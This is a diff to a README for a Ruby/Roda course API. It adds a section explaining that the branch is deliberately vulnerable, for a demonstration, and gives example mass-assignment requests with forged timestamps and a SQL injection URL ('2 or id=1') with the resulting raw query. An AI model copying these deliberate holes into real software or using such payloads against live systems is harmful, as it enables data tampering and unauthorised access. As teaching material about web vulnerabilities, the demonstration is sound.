@@ -2,6 +2,46 @@
 
 API to manage courses, events, locations, and attendance tracking.
 
+## Vulnerabilities
+
+This branch (2-demo-db-vulnerabilities) allows mass assignment and SQL injection. It does not prevent the above attacks and loosens some of Roda's built-in precautions for demonstration purposes.
+
+### Mass assignment
+
+Conduct mass assignment via POST request:
+
+```ruby
+$ rake console
+# type these within console:
+req_header = { 'CONTENT_TYPE' => 'application/json' }
+req_body = { name: 'Bad Date', created_at: '1900-01-01' }.to_json
+post '/api/v1/courses', req_body, req_header
+```
+
+Conduct mass assignment in code:
+
+```ruby
+Tyto::Course.create(
+  name: 'Future Course',
+  description: 'Manipulated timestamps',
+  created_at: Time.new(1900, 01, 01)
+)
+```
+
+### SQL Injection
+
+Conduct SQL injection via GET request vector:
+
+```bash
+http GET http://localhost:9292/api/v1/courses/2%20or%20id%3D1
+```
+
+Intent of attack is to cause code using naked SQL code to execute a manipulated SQL query as follows:
+
+```ruby
+app.DB['SELECT * FROM courses WHERE id=2 or id=1'].all.to_json
+```
+
 ## Routes
 
 All routes return JSON.
